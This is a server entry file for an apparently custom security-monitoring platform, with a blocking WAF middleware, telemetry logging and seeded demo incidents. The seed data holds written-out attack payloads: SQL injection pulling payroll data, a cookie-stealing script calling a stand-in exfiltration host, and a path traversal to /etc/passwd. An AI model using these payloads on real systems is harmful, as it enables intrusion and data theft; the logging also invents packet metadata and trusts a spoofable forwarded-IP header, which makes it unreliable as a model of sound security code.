import express from 'express';
import cors from 'cors';
import { CONFIG } from './config';
import { db } from './db/database';
import { redis } from './redis/client';
import { udpIngestServer } from './ingest/udp-ingest';
import { probeScheduler } from './prober/probe-scheduler';

// Routers
import { httpIngestRouter } from './ingest/http-ingest';
import { overviewRouter } from './routes/overview';
import { incidentsRouter } from './routes/incidents';
import { probesRouter } from './routes/probes';
import { threatsRouter } from './routes/threats';
import { queriesRouter } from './routes/queries';
import { advisorRouter } from './routes/advisor';
import { reportsRouter } from './routes/reports';
import { simulationRouter } from './routes/simulation';
import { authRouter } from './routes/auth';
import { usersRouter } from './routes/users';
import { tenantsRouter } from './routes/tenants';
import { trafficRouter } from './routes/traffic.js';
import { socRouter } from './routes/soc';
import { auditRouter } from './routes/audit';
import { scannerRouter } from './routes/scanner';
import { zeekRouter } from './routes/zeek';
import { ingestQueue } from './ingest/ingest-queue';
import { heuristicEngine } from './threat/heuristic-engine';
import { geoIPService } from './threat/geoip-service';
import { realtimeAlertHub } from './alerts/realtime-alert-hub';
import { notificationDispatcher } from './alerts/notification-dispatcher';
import { socEngine } from './soc/soc-engine';
import { authService } from './auth/auth-service';
import { getWATFormattedDate } from './db/database';

export const app = express();

app.use(cors({
  origin: '*', // Allow HRMS and any other registered system to call ingest
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Telemetry-Key', 'X-Telemetry-Signature'],
}));
app.use(express.json({ limit: '5mb' }));
app.use(express.urlencoded({ extended: true }));

// Active Self-Defense WAF & Permanent Cross-System IP Blocklist Enforcement Middleware
app.use(async (req, res, next) => {
  const clientIp = ((req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '127.0.0.1')
    .split(',')[0]
    .trim();

  // Check if caller carries a valid SUPER_ADMIN session token
  let isSuperAdminSession = false;
  const authHeader = req.headers.authorization;
  if (authHeader && authHeader.startsWith('Bearer ')) {
    const decoded = authService.verifyToken(authHeader.slice(7).trim());
    if (decoded?.role === 'SUPER_ADMIN') {
      isSuperAdminSession = true;
    }
  }

  // 1. Enforce Permanent SOC IP Blocklist BEFORE any route exemptions!
  // Any blocked IP is denied access to the entire Watch platform and NOUN-HRMS unless:
  // - Authenticated as SUPER_ADMIN, OR
  // - Calling POST /api/v1/auth/login (which itself rejects any non-SUPER_ADMIN from a blocked IP), OR
  // - NOUN-HRMS Sentinel Agent syncing the blocklist (/api/v1/soc/blocklist/active-ips, /api/v1/soc/blocklist/check/*, /api/v1/telemetry/ingest)
  const isBlocklistSyncEndpoint =
    req.path === '/api/v1/auth/login' ||
    req.path === '/api/v1/soc/blocklist/active-ips' ||
    req.path.startsWith('/api/v1/soc/blocklist/check/') ||
    req.path === '/api/v1/telemetry/ingest';

  if (socEngine.isIpBlocked(clientIp) && !isSuperAdminSession && !isBlocklistSyncEndpoint) {
    socEngine.recordBlockedRequest(clientIp);
    const blockEntry = socEngine.getBlockEntry(clientIp);
    db.saveTelemetryLog({
      id: `tel-watch-blk-${Date.now()}-${Math.random().toString(36).substr(2, 5)}`,
      system_id: 'THE-WATCH-SOC',
      method: req.method,
      path: req.originalUrl || req.path,
      status_code: 403,
      latency_ms: 1,
      client_ip: clientIp,
      payload_snippet: `[BLOCKED_BY_SOC_FIREWALL] Quarantined IP (${clientIp}) permanently denied access across The Watch & NOUN-HRMS`,
      user_agent: req.headers['user-agent'],
      headers_json: JSON.stringify({
        verdict: 'MALICIOUS_BLOCKED',
        threatClassification: blockEntry?.threatClassification || 'Quarantined IP Firewall Drop',
        direction: 'INBOUND_REQ',
        protocol: 'HTTPS/TLSv1.3',
        sourcePort: 50000 + Math.floor(Math.random() * 14000),
        destIp: '10.20.0.10 (THE-WATCH-SOC)',
        destPort: 443,
        lengthBytes: 420,
      }),
    }).catch(() => {});

    res.status(403).json({
      error: 'IP_QUARANTINED_BY_THE_WATCH_SOC',
      code: 'IP_QUARANTINED',
      message: `ACCESS PERMANENTLY DENIED: Your IP address (${clientIp}) is blocked across both The Watch SOC and NOUN-HRMS. Access cannot be restored unless unlocked by The Watch Super Admin.`,
      ip: clientIp,
      enforcedSystems: ['THE-WATCH-SOC', 'NOUN-HRMS'],
      unlockAuthority: 'SUPER_ADMIN_ONLY',
      reason: blockEntry?.reason,
      timestampWat: getWATFormattedDate(),
    });
    return;
  }

  // Skip internal SSE stream, alert rerouting, SOC management, surface scanner & simulation/ingest endpoints for heuristic payload scanning
  if (
    req.path.startsWith('/api/v1/telemetry') ||
    req.path.startsWith('/api/v1/simulation') ||
    req.path.startsWith('/api/v1/threats') ||
    req.path.startsWith('/api/v1/soc') ||
    req.path.startsWith('/api/v1/incidents') ||
    req.path.startsWith('/api/v1/reports') ||
    req.path.startsWith('/api/v1/scanner') ||
    req.path.startsWith('/api/v1/zeek') ||
    req.path.startsWith('/api/soc/zeek') ||
    req.path.startsWith('/api/v1/audit/track')
  ) {
    return next();
  }

  // 2. Inspect URL, query params, and request body for hacking / exploit signatures targeting The Watch
  const bodyStr = req.body && Object.keys(req.body).length > 0 ? JSON.stringify(req.body) : '';
  const match = heuristicEngine.evaluate({
    method: req.method,
    path: req.originalUrl || req.path,
    payload: bodyStr,
    userAgent: req.headers['user-agent'],
    clientIp,
  });

  if (match.detected) {
    (req as any).__watchThreatMatch = match;
    try {
      const geo = await geoIPService.resolve(clientIp);
      const incident = {
        id: `inc-watch-self-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
        system_id: 'THE-WATCH-SOC',
        incident_type: match.incidentType,
        threat_classification: `${match.threatClassification} (Targeting The Watch SOC)`,
        severity: match.severity,
        offending_ip: clientIp,
        geo_country: geo.country,
        geo_region: geo.region,
        geo_city: geo.city,
        geo_lat: geo.latitude,
        geo_lng: geo.longitude,
        asn: geo.asn,
        isp: geo.isp,
        is_proxy_or_vpn: geo.isProxyOrVpn,
        target_endpoint: req.originalUrl || req.path,
        http_method: req.method,
        captured_payload: bodyStr || req.originalUrl || req.path,
        status: 'UNRESOLVED' as const,
        mitigation_blueprint: match.mitigationBlueprint,
        remediation_summary: match.remediationSummary,
        created_at_wat: getWATFormattedDate(),
      };
      await db.saveIncident(incident);
      realtimeAlertHub.broadcastThreat(incident);
      socEngine.createCaseFromIncident({
        id: incident.id,
        systemId: 'THE-WATCH-SOC',
        threatClassification: incident.threat_classification,
        severity: incident.severity,
        offendingIp: clientIp,
        targetEndpoint: incident.target_endpoint,
        capturedPayload: incident.captured_payload,
      });

      if (!isSuperAdminSession && !socEngine.isOperatorWhitelisted(clientIp)) {
        socEngine.blockIp({
          ip: clientIp,
          reason: `Automated SOC Quarantine: ${match.threatClassification} targeting The Watch (${req.originalUrl || req.path})`,
          threatClassification: match.threatClassification,
          systemId: 'NOUN-HRMS & THE-WATCH-SOC',
          blockedBy: 'The Watch Self-Defense WAF',
        });
        res.status(403).json({
          error: 'IP_QUARANTINED_BY_THE_WATCH_SOC',
          code: 'IP_QUARANTINED',
          message: `INTRUSION DETECTED & IP PERMANENTLY BLOCKED: Your IP address (${clientIp}) has been blocked across The Watch and NOUN-HRMS until unlocked by The Watch Super Admin.`,
          ip: clientIp,
          enforcedSystems: ['THE-WATCH-SOC', 'NOUN-HRMS'],
          unlockAuthority: 'SUPER_ADMIN_ONLY',
          timestampWat: getWATFormattedDate(),
        });
        return;
      }
    } catch (err) {
      console.error('[SelfDefenseWAF] Error recording intrusion attempt:', err);
    }
  }

  next();
});

// Live Wireshark-Style Packet Capture for The Watch (THE-WATCH-SOC)
app.use((req, res, next) => {
  // Skip high-frequency telemetry ingest & background traffic polling so capture feed stays clean
  if (
    req.path.startsWith('/api/v1/telemetry/ingest') ||
    req.path.startsWith('/api/v1/traffic/') ||
    req.path.startsWith('/api/v1/zeek/') ||
    req.path.startsWith('/api/soc/zeek/') ||
    req.path.startsWith('/api/v1/threats/stream')
  ) {
    return next();
  }
  const start = Date.now();
  const clientIp = ((req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '127.0.0.1')
    .split(',')[0]
    .trim();

  res.on('finish', () => {
    const duration = Date.now() - start;
    if (duration > 100 || res.statusCode >= 400) {
      console.log(`[HTTP] ${req.method} ${req.path} -> ${res.statusCode} (${duration}ms)`);
    }

    const threatMatch = (req as any).__watchThreatMatch;
    const isMalicious = Boolean(threatMatch?.detected);
    const verdict = isMalicious
      ? 'MALICIOUS_BLOCKED'
      : res.statusCode >= 400
      ? 'UNSUCCESSFUL'
      : 'ALLOWED_HEALTHY';

    let safeSnippet = '';
    try {
      if (req.body && typeof req.body === 'object' && Object.keys(req.body).length > 0) {
        const redacted = { ...req.body };
        if (redacted.password) redacted.password = '[REDACTED]';
        if (redacted.token) redacted.token = '[REDACTED]';
        safeSnippet = JSON.stringify(redacted).slice(0, 260);
      }
    } catch {}

    db.saveTelemetryLog({
      id: `tel-watch-${Date.now()}-${Math.random().toString(36).substr(2, 5)}`,
      system_id: 'THE-WATCH-SOC',
      method: req.method,
      path: req.originalUrl || req.path,
      status_code: isMalicious ? 403 : res.statusCode,
      latency_ms: duration,
      client_ip: clientIp,
      payload_snippet: isMalicious
        ? `[MALICIOUS_SIGNATURE: ${threatMatch.threatClassification}] ${safeSnippet || req.originalUrl}`
        : safeSnippet || `HTTP ${res.statusCode} response from THE-WATCH-SOC`,
      user_agent: req.headers['user-agent'],
      headers_json: JSON.stringify({
        verdict,
        threatClassification: isMalicious ? threatMatch.threatClassification : undefined,
        direction: isMalicious ? 'INBOUND_REQ' : res.statusCode >= 400 ? 'OUTBOUND_RES' : 'INBOUND_AND_OUTBOUND',
        protocol: 'HTTPS/TLSv1.3',
        sourcePort: 49152 + Math.floor(Math.random() * 15000),
        destIp: '10.20.0.10 (THE-WATCH-SOC)',
        destPort: 443,
        lengthBytes: 520 + safeSnippet.length + (res.statusCode < 400 ? 980 : 210),
      }),
    }).catch(() => {});
  });
  next();
});

// Mock routes for synthetic probe targets
app.get('/api/mock/noun/health', (req, res) => {
  res.json({ status: 'UP', service: 'NOUN-HRMS Core', timestamp: new Date().toISOString() });
});

app.get('/api/mock/noun/auth/session', (req, res) => {
  res.json({ status: 'VALID', activeSessions: 1420, sessionStore: 'Redis-Cluster-OK' });
});

app.get('/api/mock/noun/payroll/status', (req, res) => {
  res.json({ status: 'IDLE', batchQueue: 0, lastRun: '2026-09-20T12:00:00Z' });
});

app.get('/api/mock/clinic/health', (req, res) => {
  res.json({ status: 'UP', service: 'Clinic-EHR', dbHealth: 'CONNECTED' });
});

app.get('/api/mock/dispatch/health', (req, res) => {
  res.json({ status: 'UP', service: 'Security-Dispatch', webrtcRelay: 'OPERATIONAL' });
});

// REST API Routers
app.use('/api/v1/auth', authRouter);
app.use('/api/v1/users', usersRouter);
app.use('/api/v1/tenants', tenantsRouter);
app.use('/api/v1/telemetry', httpIngestRouter);
app.use('/api/v1/overview', overviewRouter);
app.use('/api/v1/incidents', incidentsRouter);
app.use('/api/v1/probes', probesRouter);
app.use('/api/v1/threats', threatsRouter);
app.use('/api/v1/queries', queriesRouter);
app.use('/api/v1/advisor', advisorRouter);
app.use('/api/v1/reports', reportsRouter);
app.use('/api/v1/simulation', simulationRouter);
app.use('/api/v1/traffic', trafficRouter);
app.use('/api/v1/soc', socRouter);
app.use('/api/v1/audit', auditRouter);
app.use('/api/v1/scanner', scannerRouter);
app.use('/api/v1/zeek', zeekRouter);
app.use('/api/soc/zeek', zeekRouter);

// Root health check
app.get('/health', (req, res) => {
  res.json({
    platform: 'The Watch: Threat Intelligence & Observability Platform',
    status: 'ONLINE',
    timezone: CONFIG.TIMEZONE,
    timestamp: new Date().toISOString(),
  });
});

async function seedInitialIncidents() {
  // Pre-seed a few realistic incidents so initial dashboard load is rich
  ingestQueue.enqueue([
    {
      systemId: 'NOUN-HRMS',
      method: 'POST',
      path: '/api/v1/payroll/export',
      statusCode: 500,
      latencyMs: 120,
      clientIp: '194.26.29.112',
      payloadSnippet: `dept_id=1' UNION SELECT staff_id, full_name, bvn, salary FROM staff_payroll WHERE '1'='1' --`,
      userAgent: 'sqlmap/1.7.2#stable',
    },
    {
      systemId: 'NOUN-HRMS',
      method: 'POST',
      path: '/api/v1/auth/session',
      statusCode: 400,
      latencyMs: 30,
      clientIp: '185.220.101.5',
      payloadSnippet: `<script>fetch('https://c2-exfil.tor/loot?c='+document.cookie)</script>`,
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    },
    {
      systemId: 'Clinic-EHR',
      method: 'GET',
      path: '/api/v1/records/download?file=../../../../../../etc/passwd%00.pdf',
      statusCode: 403,
      latencyMs: 14,
      clientIp: '45.154.255.89',
      payloadSnippet: '../../../../../../etc/passwd',
    },
    {
      systemId: 'NOUN-HRMS',
      method: 'POST',
      path: '/api/v1/payroll/batch',
      statusCode: 200,
      latencyMs: 840,
      clientIp: '102.89.23.45',
      queryLatencyMs: 835.6,
      queryText: 'SELECT * FROM payroll_records WHERE tenant_id = $1 AND status = $2 ORDER BY created_at DESC',
    },
  ]);
}

export async function bootstrap(customPort?: number, customUdpPort?: number) {
  await db.initialize();
  await socEngine.syncFromDatabase();
  await redis.initialize();

  const port = customPort || parseInt(process.env.PORT || '', 10) || CONFIG.PORT;
  const udpPort = customUdpPort || parseInt(process.env.UDP_PORT || '', 10) || CONFIG.UDP_PORT;

  // Start HTTP Server
  const server = app.listen(port, CONFIG.HOST, () => {
    console.log(`\n🛡️  ======================================================`);
    console.log(`🛡️  THE WATCH: Observability & Threat Intelligence Server`);
    console.log(`🛡️  HTTP API Gateway: http://${CONFIG.HOST}:${port}`);
    console.log(`🛡️  Timezone: ${CONFIG.TIMEZONE} (WAT / UTC+1)`);
    console.log(`🛡️  ======================================================\n`);
  });

  // Start UDP Server
  udpIngestServer.start(udpPort);

  // Start Synthetic Heartbeat Prober
  probeScheduler.start(30000);

  // Seed sample telemetry
  await seedInitialIncidents();

  return server;
}

if (process.env.NODE_ENV !== 'test') {
  bootstrap().catch((err) => {
    console.error('Fatal bootstrapping error:', err);
  });

  // System Shutdown Failover: Automatically reroute alerts to +2347063054357 & abdulgaffarbello3477@gmail.com if server shuts down
  const handleShutdownFailover = async (signal: string) => {
    console.log(`\n🚨 [SYSTEM SHUTDOWN DETECTED: ${signal}] Rerouting all security alerts to Phone (${CONFIG.PRIMARY_EMERGENCY_PHONE}) & Email (${CONFIG.PRIMARY_EMERGENCY_EMAIL})...`);
    try {
      await notificationDispatcher.dispatchFailoverAlert({
        reason: 'SYSTEM_SHUTDOWN',
        systemId: 'THE-WATCH-SOC & NOUN-HRMS',
        customMessage: `CRITICAL SYSTEM SHUTDOWN (${signal}): The Watch monitoring node is powering down at ${getWATFormattedDate()}. All intrusion & security alerts for NOUN-HRMS and The Watch have been rerouted to ${CONFIG.PRIMARY_EMERGENCY_PHONE} and ${CONFIG.PRIMARY_EMERGENCY_EMAIL}.`,
      });
    } catch {}
    process.exit(0);
  };

  process.on('SIGINT', () => handleShutdownFailover('SIGINT'));
  process.on('SIGTERM', () => handleShutdownFailover('SIGTERM'));
}
